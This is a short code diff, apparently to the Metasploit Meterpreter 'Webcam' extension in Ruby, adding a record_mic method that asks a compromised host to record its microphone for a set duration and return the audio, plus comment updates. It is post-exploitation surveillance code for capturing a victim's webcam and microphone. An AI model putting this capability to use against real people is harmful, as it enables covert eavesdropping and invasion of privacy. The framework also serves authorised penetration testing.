@@ -9,7 +9,7 @@ module Webcam
 
 ###
 #
-# This meterpreter extension can list and capture from webcams
+# This meterpreter extension can list and capture from webcams and/or microphone
 #
 ###
 class Webcam
@@ -27,6 +27,7 @@ class Webcam
 		names
 	end
 
+	# Starts recording video from video source of index #{cam}
 	def webcam_start(cam)
 		request = Packet.create_request('webcam_start')
 		request.add_tlv(TLV_TYPE_WEBCAM_INTERFACE_ID, cam)
@@ -44,6 +45,15 @@ class Webcam
 	def webcam_stop
 		client.send_request( Packet.create_request( 'webcam_stop' )  )
 		true
+	end
+
+	# Record from default audio source for #{duration} seconds;
+	# returns a low-quality wav file
+	def record_mic(duration)
+		request = Packet.create_request('webcam_audio_record')
+		request.add_tlv(TLV_TYPE_AUDIO_DURATION, duration)
+		response = client.send_request(request)
+		response.get_tlv( TLV_TYPE_AUDIO_DATA ).value
 	end
 
 	attr_accessor :client
